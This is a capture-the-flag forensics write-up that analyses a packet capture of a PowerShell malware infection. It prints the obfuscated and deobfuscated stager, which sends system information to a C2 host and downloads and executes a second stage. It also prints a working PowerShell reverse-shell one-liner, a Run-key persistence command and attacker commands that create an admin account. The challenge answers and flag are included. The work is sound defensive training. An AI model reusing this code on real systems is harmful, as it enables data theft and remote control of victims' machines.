---
description: 'Category: Forensics (Medium)'
---

# PowerSploit

## Description

{% code overflow="wrap" %}
```
An alert has been raised from Northland SOC following a suspicious download of a PowerShell script onto one of the internal hosts on the network. Investigate this incident and identify any malicious activity.
```
{% endcode %}

## Walkthrough

We're provided with one file, a network capture. We can open it up in Wireshark to see what traffic was captured.

<figure><img src="../../../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>

Only 354 packets, we can look through them manually, but we'll save time by using the filters. We can start by filtering for HTTP requests, and look for anything interesting.

<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

Likely two downloads, one PowerShell script and one executable. We can extract both files by clicking on File -> Export Objects -> HTTP, and select the files to save. Alternatively, we can just follow the stream, and see what the script contains.

<figure><img src="../../../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>

The heavy obfuscation and Base64-encoded chunk highly indicate that this is malware, possibly an initial stager to pull down the subsequent stages. We can use CyberChef, a helpful tool, to perform the decoding for us.

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

The decoded and decompressed code has been copied out here

```powershell
$KGtu1  =  [TYpE]("{7}{8}{6}{9}{0}{3}{2}{4}{1}{5}" -f 'Y.p','nT','NCiPAl.wIndOWS','RI','idE','ItY','e','SY','STEM.S','cUrIT')  ;   SET-ITEM  ("vaRiABl"+"e:8"+"4R"+"Bua") ([TYPe]("{6}{7}{2}{3}{5}{0}{1}{4}" -f 'WsBUil','t','pR','inCipal','InROLE','.WiNdO','S','eCUrITy.'))  ;    Sv  ('hN'+'B2')  ( [type]("{3}{0}{1}{2}"-F 'viRoN','m','ENT','EN') ) ;    sET fzuk  ( [TYPe]("{1}{0}{2}"-f 'In','str','G') )  ;${Re`MotE`ip} = ("{1}{2}{0}"-f '100.12','172.16','.')
${remO`Te`PorT} = 80
${oU`TP`Ut} = ((("{3}{4}{5}{2}{1}{0}"-f'txt','nfo.','rcimi','C:','UsershgrPublich','g'))-crEPlacE  'hgr',[CHAr]92)
${sY`sINf`ova`Rs} = @(("{1}{0}{2}" -f 'st','Ho',' Name'), ("{1}{0}" -f ' Name','OS'), ("{0}{2}{1}"-f 'OS Ver','on','si'), ("{5}{1}{4}{0}{3}{2}"-f'igurat',' C','on','i','onf','OS'), ("{0}{2}{1}{3}" -f'System','Typ',' ','e'), ("{1}{2}{4}{3}{0}"-f'er','Re','g','red Own','iste'), ("{1}{0}{2}" -f'OS Ver','BI','sion'), ("{2}{1}{0}" -f'in','ma','Do'), ("{1}{2}{0}" -f 'er','Logon ','Serv'))

try {
    ${sYs`i`NfO} = .("{0}{1}{2}" -f 'syst','e','minfo')
    ${r`e`SUlTS} = @()
    foreach (${f`IelD} in ${S`ysi`NfOvA`RS}) {
        ${r`E`sUlTs} += (${Sysi`N`FO} | &("{1}{2}{0}"-f 't-String','Sel','ec') ${fI`E`ld}).ToString()
    }
    ${CUr`RE`NtuSER} =  (vaRiablE ('k'+'GTU1') -vaLuE )::GetCurrent()
    ${rEs`UL`Ts} += ${C`UrR`eNtuSer}
    ${I`SADM`IN} = (.("{2}{1}{3}{0}" -f't','w-Obje','Ne','c') ("{3}{0}{5}{1}{6}{4}{2}" -f 'ty.Pri','ipal.Wind','rincipal','Securi','wsP','nc','o')(${C`URR`eNT`USER})).IsInRole(  (gEt-vaRiABlE  ("84R"+"BUa")  -vALu  )::Administrator)
    ${r`ES`UlTs} += "Is Admin     : ${isAdmin}"

    ${HOmEd`IR} =  ( dir ('vAr'+'IABl'+'E:'+'hNB2') ).vALuE::GetFolderPath(("{1}{0}{2}"-f 'erProfil','Us','e'))
    ${Ou`Tp`Ut} = &("{1}{0}" -f '-Path','Join') ${ho`me`diR} ("{0}{2}{1}"-f'c','minfo.txt','i')
    ${d`IR} = .("{0}{2}{1}" -f 'Sp','ath','lit-P') ${ou`Tp`UT}
    if (-not (&("{1}{2}{0}"-f 'th','Te','st-Pa') ${D`iR})) {
    	.("{0}{1}"-f'New-I','tem') -Path ${d`ir} -ItemType ("{1}{2}{0}" -f 'ory','Dir','ect') -Force | &("{1}{0}"-f 'Null','Out-')
    }
    ${re`S`ULts} | .("{1}{0}{2}" -f'ut-F','O','ile') -FilePath ${oUT`p`UT} -Encoding ("{0}{1}"-f 'UTF','8')
    ${Re`Sp} = &("{0}{4}{3}{1}{5}{2}" -f'I','e','t','-WebRequ','nvoke','s') -Uri "${remoteIp}:${remotePort}" -Method ("{1}{0}" -f'OST','P') -InFile ${Ou`TP`UT} -UseBasicParsing
    ${paYloA`d`Id} = ${r`esP}.Content.Trim()
    if (  (  VArIABLE FzUK  -vAlUeOnly  )::IsNullOrEmpty(${pAyL`oad`Id})) {
        exit 0 
    }
    ${x} = (.("{2}{1}{3}{0}"-f '-Object','e','N','w') ("{4}{3}{0}{2}{1}"-f'.WebC','ent','li','et','N')).DownloadString("http://${remoteIp}:80/ServiceUpdater.exe")
    #Set-ItemProperty -Path "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ServiceUpdater" -Value $x -Type String
    .("{0}{1}"-f'ie','x') ${X}
} catch {
    exit 0
}

```

The second stage is even more obfuscated, likely using the [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) PowerShell utility. We can manually deobfuscate this, as it is not too difficult. Alternatively, we can also use AI to assist us in deobfuscating this program to speed up the process. For the sake of demonstration, lets use OpenAI's ChatGPT to deobfuscate this program. The conversation can be found [here](https://chatgpt.com/share/69523015-5bfc-8009-b27a-96b31b3369c8). The deobfuscated (and reconstructed) code is copied out here

```powershell
# Resolve required .NET types
$WindowsIdentityType  = [System.Security.Principal.WindowsIdentity]
$WindowsPrincipalType = [System.Security.Principal.WindowsPrincipal]
$EnvironmentType      = [Environment]
$StringType           = [String]

# C2 configuration
$remoteIp   = "172.16.100.12"
$remotePort = 80

# Initial output path (later overridden)
$output = "C:\Users\Public\ginfo.txt"

# Fields to extract from systeminfo
$sysInfoVars = @(
    "Host Name",
    "OS Name",
    "OS Version",
    "OS Configuration",
    "System Type",
    "Registered Owner",
    "BIOS Version",
    "Domain",
    "Logon Server"
)

try {
    # Collect system information
    $sysInfo = systeminfo
    $results = @()

    foreach ($field in $sysInfoVars) {
        $results += ($sysInfo | Select-String $field).ToString()
    }

    # Current user
    $currentUser = $WindowsIdentityType::GetCurrent()
    $results += $currentUser

    # Check for administrative privileges
    $isAdmin = (New-Object System.Security.Principal.WindowsPrincipal($currentUser)).
               IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)

    $results += "Is Admin     : $isAdmin"

    # Resolve user profile directory
    $homeDir = [Environment]::GetFolderPath("UserProfile")

    # Final output file
    $output = Join-Path $homeDir "ciminf.txt"

    # Ensure directory exists
    $dir = Split-Path $output
    if (-not (Test-Path $dir)) {
        New-Item -Path $dir -ItemType Directory -Force | Out-Null
    }

    # Write collected data to disk
    $results | Out-File -FilePath $output -Encoding UTF8

    # POST system info to C2
    $resp = Invoke-WebRequest `
        -Uri "$remoteIp:$remotePort" `
        -Method POST `
        -InFile $output `
        -UseBasicParsing

    # Payload identifier returned by server
    $payloadId = $resp.Content.Trim()

    if ([String]::IsNullOrEmpty($payloadId)) {
        exit 0
    }

    # Download and execute second-stage payload
    $x = (New-Object Net.WebClient).
         DownloadString("http://$remoteIp:80/ServiceUpdater.exe")

    Invoke-Expression $x
}
catch {
    exit 0
}

```

As the AI has correctly identified, the stager performs the following actions

* Enumerates system information, and writes it to ciminfo.txt
* Checks if the current user is an administrator, and writes it to ciminfo.txt
* Sends ciminfo.txt to the C2 server at 172.16.100.12
* Request for the contents of ServiceUpdater.exe from the remote server, and execute it

In addition, the program has the following commented-out command

```powershell
Set-ItemProperty -Path "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" -Name 
"ServiceUpdater" -Value $x -Type String
```

This command would have added a new entry to the registry, which will execute the contents of ServiceUpdater.exe. If we check ServiceUpdater.exe, we'll see the following source code

{% code overflow="wrap" %}
```powershell
$client = New-Object System.Net.Sockets.TCPClient("172.16.100.12",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
{% endcode %}

All this does is spawn a reverse shell back to the attacker system at 172.16.100.12.&#x20;

We can continue further analysis on the network capture, by following the subsequent streams. On TCP stream 3, we can see what appears to be Windows commands and command outputs, strongly suggesting that this stream is the reverse shell.

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

We can look at the command history, and see what the attacker does. Below is the timeline of the attacker's commands after getting a reverse shell.

* Check the current user (<mark style="color:red;">**whoami**</mark>) and current working directory (<mark style="color:red;">**pwd**</mark>)
* Check the available network adapters, possibly for lateral movement (<mark style="color:red;">**ipconfig**</mark>)
* Check the current user's group memberships (<mark style="color:red;">**net user Solitude**</mark>), and list available local groups (<mark style="color:red;">**net localgroup**</mark>)
* Create a new user Ichinose (<mark style="color:red;">**net user /add Ichinose password123**</mark>), and add them to the Administrators localgroup (<mark style="color:red;">**net localgroup Administrators Ichinose /add**</mark>), possibly as a persistence mechanism&#x20;
* Further enumeration of the filesystem
* Read a confidential file (<mark style="color:red;">**type confidential.txt**</mark>)

### Answers

Now that we've concluded the forensics investigation, we can now connect to the server and get our flag.

1. What is the IP address of the C2 server? - 172.16.100.12
2. What is the file name that system information is written to? - ciminfo.txt
3. What registry key does the attacker attempt to write the persistence mechanism to? - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
4. What is the name of the persistence mechanism given by the attacker - ServiceUpdater
5. What port does the reverse shell connect to? - 443
6. How long does the attacker connect to the victim workstation? - 110.588415
7. The attacker reads a confidential file on the victim workstation. What is the contents of the file? - 0d550b3f9c28988953197836d9f2db696db24fbb64d9dd10e7c6e4ba5003e51f
8. The attacker attempted to create a new local administrator user. What is the name of the user account? - Ichinose

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

## Creator's Notes

This was a relatively easy challenge to make, and I don't have much to comment regarding the challenge creation process.&#x20;

During the CTF, I noticed that many players had issues with solving Q6, where the server asks for the total time when the reverse shell was running. Due to the hint provided, many players either assumed that they had to answer as an integer, or answer with a lower accuracy (e.g. 2d.p). Some players also had issues with finding the correct start and end packets, using the packet of the first and last commands instead of the first and last packets in the stream.&#x20;

Overall, this challenge was pretty easy. I had originally intended to make this a multi-stage malware investigation as per suggestion from a friend, but did not have the time to do so. Perhaps in future I will do something akin to a simulated APT malware attack, but for now I don't have the skills or knowledge to do that.&#x20;
